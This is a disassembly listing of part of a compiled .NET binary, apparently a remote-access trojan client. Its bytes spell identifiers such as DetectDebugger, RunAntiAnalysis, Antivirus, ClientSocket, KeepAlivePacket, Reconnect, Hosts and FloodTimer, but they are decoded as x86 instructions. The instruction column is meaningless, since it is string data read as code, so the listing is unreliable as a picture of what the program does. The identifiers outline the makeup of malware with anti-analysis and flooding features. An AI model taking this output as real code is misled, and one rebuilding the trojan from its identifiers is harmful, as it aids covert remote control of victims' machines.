  4069ed:	73 65                	jae    0x406a54
  4069ef:	74 5f                	je     0x406a50
  4069f1:	42                   	inc    %edx
  4069f2:	75 66                	jne    0x406a5a
  4069f4:	66 65 72 00          	data16 gs jb 0x4069f8
  4069f8:	53                   	push   %ebx
  4069f9:	65 74 41             	gs je  0x406a3d
  4069fc:	73 49                	jae    0x406a47
  4069fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4069ff:	74 65                	je     0x406a66
  406a01:	67 65 72 00          	addr16 gs jb 0x406a05
  406a05:	44                   	inc    %esp
  406a06:	65 74 65             	gs je  0x406a6e
  406a09:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  406a0d:	62 75 67             	bound  %esi,0x67(%ebp)
  406a10:	67 65 72 00          	addr16 gs jb 0x406a14
  406a14:	4d                   	dec    %ebp
  406a15:	61                   	popa
  406a16:	6e                   	outsb  %ds:(%esi),(%dx)
  406a17:	61                   	popa
  406a18:	67 65 6d             	gs insl (%dx),%es:(%di)
  406a1b:	65 6e                	outsb  %gs:(%esi),(%dx)
  406a1d:	74 4f                	je     0x406a6e
  406a1f:	62 6a 65             	bound  %ebp,0x65(%edx)
  406a22:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  406a26:	61                   	popa
  406a27:	72 63                	jb     0x406a8c
  406a29:	68 65 72 00 53       	push   $0x53007265
  406a2e:	65 73 73             	gs jae 0x406aa4
  406a31:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  406a38:	6e                   	outsb  %ds:(%esi),(%dx)
  406a39:	67 45                	addr16 inc %ebp
  406a3b:	76 65                	jbe    0x406aa2
  406a3d:	6e                   	outsb  %ds:(%esi),(%dx)
  406a3e:	74 48                	je     0x406a88
  406a40:	61                   	popa
  406a41:	6e                   	outsb  %ds:(%esi),(%dx)
  406a42:	64 6c                	fs insb (%dx),%es:(%edi)
  406a44:	65 72 00             	gs jb  0x406a47
  406a47:	46                   	inc    %esi
  406a48:	6c                   	insb   (%dx),%es:(%edi)
  406a49:	6f                   	outsl  %ds:(%esi),(%dx)
  406a4a:	6f                   	outsl  %ds:(%esi),(%dx)
  406a4b:	64 54                	fs push %esp
  406a4d:	69 6d 65 72 00 43 6c 	imul   $0x6c430072,0x65(%ebp),%ebp
  406a54:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  406a5b:	6c                   	insb   (%dx),%es:(%edi)
  406a5c:	70 65                	jo     0x406ac3
  406a5e:	72 00                	jb     0x406a60
  406a60:	54                   	push   %esp
  406a61:	6f                   	outsl  %ds:(%esi),(%dx)
  406a62:	55                   	push   %ebp
  406a63:	70 70                	jo     0x406ad5
  406a65:	65 72 00             	gs jb  0x406a68
  406a68:	44                   	inc    %esp
  406a69:	65 74 65             	gs je  0x406ad1
  406a6c:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  406a70:	6e                   	outsb  %ds:(%esi),(%dx)
  406a71:	75 66                	jne    0x406ad9
  406a73:	61                   	popa
  406a74:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  406a78:	65 72 00             	gs jb  0x406a7b
  406a7b:	43                   	inc    %ebx
  406a7c:	75 72                	jne    0x406af0
  406a7e:	72 65                	jb     0x406ae5
  406a80:	6e                   	outsb  %ds:(%esi),(%dx)
  406a81:	74 55                	je     0x406ad8
  406a83:	73 65                	jae    0x406aea
  406a85:	72 00                	jb     0x406a87
  406a87:	53                   	push   %ebx
  406a88:	74 72                	je     0x406afc
  406a8a:	65 61                	gs popa
  406a8c:	6d                   	insl   (%dx),%es:(%edi)
  406a8d:	57                   	push   %edi
  406a8e:	72 69                	jb     0x406af9
  406a90:	74 65                	je     0x406af7
  406a92:	72 00                	jb     0x406a94
  406a94:	54                   	push   %esp
  406a95:	65 78 74             	gs js  0x406b0c
  406a98:	57                   	push   %edi
  406a99:	72 69                	jb     0x406b04
  406a9b:	74 65                	je     0x406b02
  406a9d:	72 00                	jb     0x406a9f
  406a9f:	45                   	inc    %ebp
  406aa0:	6e                   	outsb  %ds:(%esi),(%dx)
  406aa1:	74 65                	je     0x406b08
  406aa3:	72 00                	jb     0x406aa5
  406aa5:	42                   	inc    %edx
  406aa6:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  406aad:	72 
  406aae:	74 65                	je     0x406b15
  406ab0:	72 00                	jb     0x406ab2
  406ab2:	54                   	push   %esp
  406ab3:	6f                   	outsl  %ds:(%esi),(%dx)
  406ab4:	4c                   	dec    %esp
  406ab5:	6f                   	outsl  %ds:(%esi),(%dx)
  406ab6:	77 65                	ja     0x406b1d
  406ab8:	72 00                	jb     0x406aba
  406aba:	45                   	inc    %ebp
  406abb:	72 72                	jb     0x406b2f
  406abd:	6f                   	outsl  %ds:(%esi),(%dx)
  406abe:	72 00                	jb     0x406ac0
  406ac0:	4d                   	dec    %ebp
  406ac1:	61                   	popa
  406ac2:	6e                   	outsb  %ds:(%esi),(%dx)
  406ac3:	61                   	popa
  406ac4:	67 65 6d             	gs insl (%dx),%es:(%di)
  406ac7:	65 6e                	outsb  %gs:(%esi),(%dx)
  406ac9:	74 4f                	je     0x406b1a
  406acb:	62 6a 65             	bound  %ebp,0x65(%edx)
  406ace:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  406ad2:	75 6d                	jne    0x406b41
  406ad4:	65 72 61             	gs jb  0x406b38
  406ad7:	74 6f                	je     0x406b48
  406ad9:	72 00                	jb     0x406adb
  406adb:	47                   	inc    %edi
  406adc:	65 74 45             	gs je  0x406b24
  406adf:	6e                   	outsb  %ds:(%esi),(%dx)
  406ae0:	75 6d                	jne    0x406b4f
  406ae2:	65 72 61             	gs jb  0x406b46
  406ae5:	74 6f                	je     0x406b56
  406ae7:	72 00                	jb     0x406ae9
  406ae9:	41                   	inc    %ecx
  406aea:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406aee:	61                   	popa
  406aef:	74 6f                	je     0x406b60
  406af1:	72 00                	jb     0x406af3
  406af3:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  406af8:	00 2e                	add    %ch,(%esi)
  406afa:	63 63 74             	arpl   %esp,0x74(%ebx)
  406afd:	6f                   	outsl  %ds:(%esi),(%dx)
  406afe:	72 00                	jb     0x406b00
  406b00:	4d                   	dec    %ebp
  406b01:	6f                   	outsl  %ds:(%esi),(%dx)
  406b02:	6e                   	outsb  %ds:(%esi),(%dx)
  406b03:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  406b0a:	65 
  406b0b:	61                   	popa
  406b0c:	74 65                	je     0x406b73
  406b0e:	44                   	inc    %esp
  406b0f:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  406b13:	70 74                	jo     0x406b89
  406b15:	6f                   	outsl  %ds:(%esi),(%dx)
  406b16:	72 00                	jb     0x406b18
  406b18:	43                   	inc    %ebx
  406b19:	72 65                	jb     0x406b80
  406b1b:	61                   	popa
  406b1c:	74 65                	je     0x406b83
  406b1e:	45                   	inc    %ebp
  406b1f:	6e                   	outsb  %ds:(%esi),(%dx)
  406b20:	63 72 79             	arpl   %esi,0x79(%edx)
  406b23:	70 74                	jo     0x406b99
  406b25:	6f                   	outsl  %ds:(%esi),(%dx)
  406b26:	72 00                	jb     0x406b28
  406b28:	49                   	dec    %ecx
  406b29:	6e                   	outsb  %ds:(%esi),(%dx)
  406b2a:	74 50                	je     0x406b7c
  406b2c:	74 72                	je     0x406ba0
  406b2e:	00 53 79             	add    %dl,0x79(%ebx)
  406b31:	73 74                	jae    0x406ba7
  406b33:	65 6d                	gs insl (%dx),%es:(%edi)
  406b35:	2e 44                	cs inc %esp
  406b37:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  406b3e:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  406b45:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  406b4c:	6f                   	outsl  %ds:(%esi),(%dx)
  406b4d:	64 73 00             	fs jae 0x406b50
  406b50:	4d                   	dec    %ebp
  406b51:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406b58:	74 2e                	je     0x406b88
  406b5a:	56                   	push   %esi
  406b5b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  406b62:	73 69                	jae    0x406bcd
  406b64:	63 2e                	arpl   %ebp,(%esi)
  406b66:	44                   	inc    %esp
  406b67:	65 76 69             	gs jbe 0x406bd3
  406b6a:	63 65 73             	arpl   %esp,0x73(%ebp)
  406b6d:	00 53 79             	add    %dl,0x79(%ebx)
  406b70:	73 74                	jae    0x406be6
  406b72:	65 6d                	gs insl (%dx),%es:(%edi)
  406b74:	2e 52                	cs push %edx
  406b76:	75 6e                	jne    0x406be6
  406b78:	74 69                	je     0x406be3
  406b7a:	6d                   	insl   (%dx),%es:(%edi)
  406b7b:	65 2e 49             	gs cs dec %ecx
  406b7e:	6e                   	outsb  %ds:(%esi),(%dx)
  406b7f:	74 65                	je     0x406be6
  406b81:	72 6f                	jb     0x406bf2
  406b83:	70 53                	jo     0x406bd8
  406b85:	65 72 76             	gs jb  0x406bfe
  406b88:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  406b8f:	73 74                	jae    0x406c05
  406b91:	65 6d                	gs insl (%dx),%es:(%edi)
  406b93:	2e 52                	cs push %edx
  406b95:	75 6e                	jne    0x406c05
  406b97:	74 69                	je     0x406c02
  406b99:	6d                   	insl   (%dx),%es:(%edi)
  406b9a:	65 2e 43             	gs cs inc %ebx
  406b9d:	6f                   	outsl  %ds:(%esi),(%dx)
  406b9e:	6d                   	insl   (%dx),%es:(%edi)
  406b9f:	70 69                	jo     0x406c0a
  406ba1:	6c                   	insb   (%dx),%es:(%edi)
  406ba2:	65 72 53             	gs jb  0x406bf8
  406ba5:	65 72 76             	gs jb  0x406c1e
  406ba8:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  406baf:	62 75 67             	bound  %esi,0x67(%ebp)
  406bb2:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  406bb9:	65 
  406bba:	73 00                	jae    0x406bbc
  406bbc:	45                   	inc    %ebp
  406bbd:	78 70                	js     0x406c2f
  406bbf:	61                   	popa
  406bc0:	6e                   	outsb  %ds:(%esi),(%dx)
  406bc1:	64 45                	fs inc %ebp
  406bc3:	6e                   	outsb  %ds:(%esi),(%dx)
  406bc4:	76 69                	jbe    0x406c2f
  406bc6:	72 6f                	jb     0x406c37
  406bc8:	6e                   	outsb  %ds:(%esi),(%dx)
  406bc9:	6d                   	insl   (%dx),%es:(%edi)
  406bca:	65 6e                	outsb  %gs:(%esi),(%dx)
  406bcc:	74 56                	je     0x406c24
  406bce:	61                   	popa
  406bcf:	72 69                	jb     0x406c3a
  406bd1:	61                   	popa
  406bd2:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  406bd6:	00 47 65             	add    %al,0x65(%edi)
  406bd9:	74 50                	je     0x406c2b
  406bdb:	72 6f                	jb     0x406c4c
  406bdd:	63 65 73             	arpl   %esp,0x73(%ebp)
  406be0:	73 65                	jae    0x406c47
  406be2:	73 00                	jae    0x406be4
  406be4:	47                   	inc    %edi
  406be5:	65 74 48             	gs je  0x406c30
  406be8:	6f                   	outsl  %ds:(%esi),(%dx)
  406be9:	73 74                	jae    0x406c5f
  406beb:	41                   	inc    %ecx
  406bec:	64 64 72 65          	fs fs jb 0x406c55
  406bf0:	73 73                	jae    0x406c65
  406bf2:	65 73 00             	gs jae 0x406bf5
  406bf5:	53                   	push   %ebx
  406bf6:	79 73                	jns    0x406c6b
  406bf8:	74 65                	je     0x406c5f
  406bfa:	6d                   	insl   (%dx),%es:(%edi)
  406bfb:	2e 53                	cs push %ebx
  406bfd:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  406c01:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  406c08:	70 
  406c09:	74 6f                	je     0x406c7a
  406c0b:	67 72 61             	addr16 jb 0x406c6f
  406c0e:	70 68                	jo     0x406c78
  406c10:	79 2e                	jns    0x406c40
  406c12:	58                   	pop    %eax
  406c13:	35 30 39 43 65       	xor    $0x65433930,%eax
  406c18:	72 74                	jb     0x406c8e
  406c1a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406c21:	73 00                	jae    0x406c23
  406c23:	45                   	inc    %ebp
  406c24:	6e                   	outsb  %ds:(%esi),(%dx)
  406c25:	63 6f 64             	arpl   %ebp,0x64(%edi)
  406c28:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  406c2c:	74 65                	je     0x406c93
  406c2e:	73 00                	jae    0x406c30
  406c30:	52                   	push   %edx
  406c31:	66 63 32             	arpl   %si,(%edx)
  406c34:	38 39                	cmp    %bh,(%ecx)
  406c36:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  406c3a:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  406c41:	73 00                	jae    0x406c43
  406c43:	52                   	push   %edx
  406c44:	65 61                	gs popa
  406c46:	64 41                	fs inc %ecx
  406c48:	6c                   	insb   (%dx),%es:(%edi)
  406c49:	6c                   	insb   (%dx),%es:(%edi)
  406c4a:	42                   	inc    %edx
  406c4b:	79 74                	jns    0x406cc1
  406c4d:	65 73 00             	gs jae 0x406c50
  406c50:	44                   	inc    %esp
  406c51:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  406c55:	65 46                	gs inc %esi
  406c57:	72 6f                	jb     0x406cc8
  406c59:	6d                   	insl   (%dx),%es:(%edi)
  406c5a:	42                   	inc    %edx
  406c5b:	79 74                	jns    0x406cd1
  406c5d:	65 73 00             	gs jae 0x406c60
  406c60:	47                   	inc    %edi
  406c61:	65 74 41             	gs je  0x406ca5
  406c64:	73 42                	jae    0x406ca8
  406c66:	79 74                	jns    0x406cdc
  406c68:	65 73 00             	gs jae 0x406c6b
  406c6b:	47                   	inc    %edi
  406c6c:	65 74 42             	gs je  0x406cb1
  406c6f:	79 74                	jns    0x406ce5
  406c71:	65 73 00             	gs jae 0x406c74
  406c74:	43                   	inc    %ebx
  406c75:	53                   	push   %ebx
  406c76:	68 61 72 70 41       	push   $0x41707261
  406c7b:	72 67                	jb     0x406ce4
  406c7d:	75 6d                	jne    0x406cec
  406c7f:	65 6e                	outsb  %gs:(%esi),(%dx)
  406c81:	74 49                	je     0x406ccc
  406c83:	6e                   	outsb  %ds:(%esi),(%dx)
  406c84:	66 6f                	outsw  %ds:(%esi),(%dx)
  406c86:	46                   	inc    %esi
  406c87:	6c                   	insb   (%dx),%es:(%edi)
  406c88:	61                   	popa
  406c89:	67 73 00             	addr16 jae 0x406c8c
  406c8c:	43                   	inc    %ebx
  406c8d:	53                   	push   %ebx
  406c8e:	68 61 72 70 42       	push   $0x42707261
  406c93:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  406c9a:	61                   	popa
  406c9b:	67 73 00             	addr16 jae 0x406c9e
  406c9e:	65 73 46             	gs jae 0x406ce7
  406ca1:	6c                   	insb   (%dx),%es:(%edi)
  406ca2:	61                   	popa
  406ca3:	67 73 00             	addr16 jae 0x406ca6
  406ca6:	53                   	push   %ebx
  406ca7:	74 72                	je     0x406d1b
  406ca9:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  406cb0:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  406cb7:	65 
  406cb8:	53                   	push   %ebx
  406cb9:	65 74 74             	gs je  0x406d30
  406cbc:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  406cc3:	73 73                	jae    0x406d38
  406cc5:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  406ccc:	6e                   	outsb  %ds:(%esi),(%dx)
  406ccd:	67 45                	addr16 inc %ebp
  406ccf:	76 65                	jbe    0x406d36
  406cd1:	6e                   	outsb  %ds:(%esi),(%dx)
  406cd2:	74 41                	je     0x406d15
  406cd4:	72 67                	jb     0x406d3d
  406cd6:	73 00                	jae    0x406cd8
  406cd8:	41                   	inc    %ecx
  406cd9:	6e                   	outsb  %ds:(%esi),(%dx)
  406cda:	74 69                	je     0x406d45
  406cdc:	5f                   	pop    %edi
  406cdd:	41                   	inc    %ecx
  406cde:	6e                   	outsb  %ds:(%esi),(%dx)
  406cdf:	61                   	popa
  406ce0:	6c                   	insb   (%dx),%es:(%edi)
  406ce1:	79 73                	jns    0x406d56
  406ce3:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  406cea:	6e                   	outsb  %ds:(%esi),(%dx)
  406ceb:	74 69                	je     0x406d56
  406ced:	41                   	inc    %ecx
  406cee:	6e                   	outsb  %ds:(%esi),(%dx)
  406cef:	61                   	popa
  406cf0:	6c                   	insb   (%dx),%es:(%edi)
  406cf1:	79 73                	jns    0x406d66
  406cf3:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  406cfa:	73 00                	jae    0x406cfc
  406cfc:	49                   	dec    %ecx
  406cfd:	43                   	inc    %ebx
  406cfe:	72 65                	jb     0x406d65
  406d00:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406d03:	74 69                	je     0x406d6e
  406d05:	61                   	popa
  406d06:	6c                   	insb   (%dx),%es:(%edi)
  406d07:	73 00                	jae    0x406d09
  406d09:	73 65                	jae    0x406d70
  406d0b:	74 5f                	je     0x406d6c
  406d0d:	43                   	inc    %ebx
  406d0e:	72 65                	jb     0x406d75
  406d10:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  406d13:	74 69                	je     0x406d7e
  406d15:	61                   	popa
  406d16:	6c                   	insb   (%dx),%es:(%edi)
  406d17:	73 00                	jae    0x406d19
  406d19:	53                   	push   %ebx
  406d1a:	73 6c                	jae    0x406d88
  406d1c:	50                   	push   %eax
  406d1d:	72 6f                	jb     0x406d8e
  406d1f:	74 6f                	je     0x406d90
  406d21:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  406d24:	73 00                	jae    0x406d26
  406d26:	53                   	push   %ebx
  406d27:	79 73                	jns    0x406d9c
  406d29:	74 65                	je     0x406d90
  406d2b:	6d                   	insl   (%dx),%es:(%edi)
  406d2c:	2e 57                	cs push %edi
  406d2e:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  406d35:	46                   	inc    %esi
  406d36:	6f                   	outsl  %ds:(%esi),(%dx)
  406d37:	72 6d                	jb     0x406da6
  406d39:	73 00                	jae    0x406d3b
  406d3b:	44                   	inc    %esp
  406d3c:	6e                   	outsb  %ds:(%esi),(%dx)
  406d3d:	73 00                	jae    0x406d3f
  406d3f:	43                   	inc    %ebx
  406d40:	6f                   	outsl  %ds:(%esi),(%dx)
  406d41:	6e                   	outsb  %ds:(%esi),(%dx)
  406d42:	74 61                	je     0x406da5
  406d44:	69 6e 73 00 53 74 72 	imul   $0x72745300,0x73(%esi),%ebp
  406d4b:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  406d52:	74 4f                	je     0x406da3
  406d54:	70 74                	jo     0x406dca
  406d56:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  406d5d:	74 49                	je     0x406da8
  406d5f:	6d                   	insl   (%dx),%es:(%edi)
  406d60:	61                   	popa
  406d61:	67 65 44             	addr16 gs inc %esp
  406d64:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  406d68:	65 72 73             	gs jb  0x406dde
  406d6b:	00 52 75             	add    %dl,0x75(%edx)
  406d6e:	6e                   	outsb  %ds:(%esi),(%dx)
  406d6f:	74 69                	je     0x406dda
  406d71:	6d                   	insl   (%dx),%es:(%edi)
  406d72:	65 48                	gs dec %eax
  406d74:	65 6c                	gs insb (%dx),%es:(%edi)
  406d76:	70 65                	jo     0x406ddd
  406d78:	72 73                	jb     0x406ded
  406d7a:	00 53 73             	add    %dl,0x73(%ebx)
  406d7d:	6c                   	insb   (%dx),%es:(%edi)
  406d7e:	50                   	push   %eax
  406d7f:	6f                   	outsl  %ds:(%esi),(%dx)
  406d80:	6c                   	insb   (%dx),%es:(%edi)
  406d81:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  406d88:	72 73                	jb     0x406dfd
  406d8a:	00 73 73             	add    %dh,0x73(%ebx)
  406d8d:	6c                   	insb   (%dx),%es:(%edi)
  406d8e:	50                   	push   %eax
  406d8f:	6f                   	outsl  %ds:(%esi),(%dx)
  406d90:	6c                   	insb   (%dx),%es:(%edi)
  406d91:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  406d98:	72 73                	jb     0x406e0d
  406d9a:	00 68 50             	add    %ch,0x50(%eax)
  406d9d:	72 6f                	jb     0x406e0e
  406d9f:	63 65 73             	arpl   %esp,0x73(%ebp)
  406da2:	73 00                	jae    0x406da4
  406da4:	47                   	inc    %edi
  406da5:	65 74 43             	gs je  0x406deb
  406da8:	75 72                	jne    0x406e1c
  406daa:	72 65                	jb     0x406e11
  406dac:	6e                   	outsb  %ds:(%esi),(%dx)
  406dad:	74 50                	je     0x406dff
  406daf:	72 6f                	jb     0x406e20
  406db1:	63 65 73             	arpl   %esp,0x73(%ebp)
  406db4:	73 00                	jae    0x406db6
  406db6:	49                   	dec    %ecx
  406db7:	50                   	push   %eax
  406db8:	41                   	inc    %ecx
  406db9:	64 64 72 65          	fs fs jb 0x406e22
  406dbd:	73 73                	jae    0x406e32
  406dbf:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  406dc3:	6f                   	outsl  %ds:(%esi),(%dx)
  406dc4:	6d                   	insl   (%dx),%es:(%edi)
  406dc5:	70 72                	jo     0x406e39
  406dc7:	65 73 73             	gs jae 0x406e3d
  406dca:	00 53 79             	add    %dl,0x79(%ebx)
  406dcd:	73 74                	jae    0x406e43
  406dcf:	65 6d                	gs insl (%dx),%es:(%edi)
  406dd1:	2e 4e                	cs dec %esi
  406dd3:	65 74 2e             	gs je  0x406e04
  406dd6:	53                   	push   %ebx
  406dd7:	6f                   	outsl  %ds:(%esi),(%dx)
  406dd8:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406ddb:	74 73                	je     0x406e50
  406ddd:	00 73 65             	add    %dh,0x65(%ebx)
  406de0:	74 5f                	je     0x406e41
  406de2:	41                   	inc    %ecx
  406de3:	72 67                	jb     0x406e4c
  406de5:	75 6d                	jne    0x406e54
  406de7:	65 6e                	outsb  %gs:(%esi),(%dx)
  406de9:	74 73                	je     0x406e5e
  406deb:	00 53 79             	add    %dl,0x79(%ebx)
  406dee:	73 74                	jae    0x406e64
  406df0:	65 6d                	gs insl (%dx),%es:(%edi)
  406df2:	45                   	inc    %ebp
  406df3:	76 65                	jbe    0x406e5a
  406df5:	6e                   	outsb  %ds:(%esi),(%dx)
  406df6:	74 73                	je     0x406e6b
  406df8:	00 50 6f             	add    %dl,0x6f(%eax)
  406dfb:	72 74                	jb     0x406e71
  406dfd:	73 00                	jae    0x406dff
  406dff:	45                   	inc    %ebp
  406e00:	78 69                	js     0x406e6b
  406e02:	73 74                	jae    0x406e78
  406e04:	73 00                	jae    0x406e06
  406e06:	48                   	dec    %eax
  406e07:	6f                   	outsl  %ds:(%esi),(%dx)
  406e08:	73 74                	jae    0x406e7e
  406e0a:	73 00                	jae    0x406e0c
  406e0c:	41                   	inc    %ecx
  406e0d:	6e                   	outsb  %ds:(%esi),(%dx)
  406e0e:	74 69                	je     0x406e79
  406e10:	76 69                	jbe    0x406e7b
  406e12:	72 75                	jb     0x406e89
  406e14:	73 00                	jae    0x406e16
  406e16:	43                   	inc    %ebx
  406e17:	6f                   	outsl  %ds:(%esi),(%dx)
  406e18:	6e                   	outsb  %ds:(%esi),(%dx)
  406e19:	63 61 74             	arpl   %esp,0x74(%ecx)
  406e1c:	00 49 6d             	add    %cl,0x6d(%ecx)
  406e1f:	61                   	popa
  406e20:	67 65 46             	addr16 gs inc %esi
  406e23:	6f                   	outsl  %ds:(%esi),(%dx)
  406e24:	72 6d                	jb     0x406e93
  406e26:	61                   	popa
  406e27:	74 00                	je     0x406e29
  406e29:	66 6f                	outsw  %ds:(%esi),(%dx)
  406e2b:	72 6d                	jb     0x406e9a
  406e2d:	61                   	popa
  406e2e:	74 00                	je     0x406e30
  406e30:	4d                   	dec    %ebp
  406e31:	61                   	popa
  406e32:	6e                   	outsb  %ds:(%esi),(%dx)
  406e33:	61                   	popa
  406e34:	67 65 6d             	gs insl (%dx),%es:(%di)
  406e37:	65 6e                	outsb  %gs:(%esi),(%dx)
  406e39:	74 42                	je     0x406e7d
  406e3b:	61                   	popa
  406e3c:	73 65                	jae    0x406ea3
  406e3e:	4f                   	dec    %edi
  406e3f:	62 6a 65             	bound  %ebp,0x65(%edx)
  406e42:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  406e46:	6f                   	outsl  %ds:(%esi),(%dx)
  406e47:	72 63                	jb     0x406eac
  406e49:	65 50                	gs push %eax
  406e4b:	61                   	popa
  406e4c:	74 68                	je     0x406eb6
  406e4e:	4f                   	dec    %edi
  406e4f:	62 6a 65             	bound  %ebp,0x65(%edx)
  406e52:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  406e56:	6f                   	outsl  %ds:(%esi),(%dx)
  406e57:	6c                   	insb   (%dx),%es:(%edi)
  406e58:	6c                   	insb   (%dx),%es:(%edi)
  406e59:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  406e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  406e5f:	6e                   	outsb  %ds:(%esi),(%dx)
  406e60:	6e                   	outsb  %ds:(%esi),(%dx)
  406e61:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  406e66:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  406e6a:	6e                   	outsb  %ds:(%esi),(%dx)
  406e6b:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  406e70:	65 74 00             	gs je  0x406e73
  406e73:	53                   	push   %ebx
  406e74:	79 73                	jns    0x406ee9
  406e76:	74 65                	je     0x406edd
  406e78:	6d                   	insl   (%dx),%es:(%edi)
  406e79:	2e 4e                	cs dec %esi
  406e7b:	65 74 00             	gs je  0x406e7e
  406e7e:	53                   	push   %ebx
  406e7f:	65 74 00             	gs je  0x406e82
  406e82:	54                   	push   %esp
  406e83:	61                   	popa
  406e84:	72 67                	jb     0x406eed
  406e86:	65 74 00             	gs je  0x406e89
  406e89:	43                   	inc    %ebx
  406e8a:	6c                   	insb   (%dx),%es:(%edi)
  406e8b:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  406e92:	6e                   	outsb  %ds:(%esi),(%dx)
  406e93:	64 6c                	fs insb (%dx),%es:(%edi)
  406e95:	65 5f                	gs pop %edi
  406e97:	50                   	push   %eax
  406e98:	61                   	popa
  406e99:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  406e9c:	74 00                	je     0x406e9e
  406e9e:	4b                   	dec    %ebx
  406e9f:	65 65 70 41          	gs gs jo 0x406ee4
  406ea3:	6c                   	insb   (%dx),%es:(%edi)
  406ea4:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  406eab:	65 74 00             	gs je  0x406eae
  406eae:	43                   	inc    %ebx
  406eaf:	6c                   	insb   (%dx),%es:(%edi)
  406eb0:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  406eb7:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  406ebb:	67 65 74 5f          	addr16 gs je 0x406f1e
  406ebf:	4f                   	dec    %edi
  406ec0:	66 66 73 65          	data16 data16 jae 0x406f29
  406ec4:	74 00                	je     0x406ec6
  406ec6:	73 65                	jae    0x406f2d
  406ec8:	74 5f                	je     0x406f29
  406eca:	4f                   	dec    %edi
  406ecb:	66 66 73 65          	data16 data16 jae 0x406f34
  406ecf:	74 00                	je     0x406ed1
  406ed1:	53                   	push   %ebx
  406ed2:	70 6c                	jo     0x406f40
  406ed4:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  406edb:	6e 
  406edc:	74 4f                	je     0x406f2d
  406ede:	6e                   	outsb  %ds:(%esi),(%dx)
  406edf:	45                   	inc    %ebp
  406ee0:	78 69                	js     0x406f4b
  406ee2:	74 00                	je     0x406ee4
  406ee4:	53                   	push   %ebx
  406ee5:	61                   	popa
  406ee6:	6c                   	insb   (%dx),%es:(%edi)
  406ee7:	74 00                	je     0x406ee9
  406ee9:	49                   	dec    %ecx
  406eea:	41                   	inc    %ecx
  406eeb:	73 79                	jae    0x406f66
  406eed:	6e                   	outsb  %ds:(%esi),(%dx)
  406eee:	63 52 65             	arpl   %edx,0x65(%edx)
  406ef1:	73 75                	jae    0x406f68
  406ef3:	6c                   	insb   (%dx),%es:(%edi)
  406ef4:	74 00                	je     0x406ef6
  406ef6:	54                   	push   %esp
  406ef7:	6f                   	outsl  %ds:(%esi),(%dx)
  406ef8:	55                   	push   %ebp
  406ef9:	70 70                	jo     0x406f6b
  406efb:	65 72 49             	gs jb  0x406f47
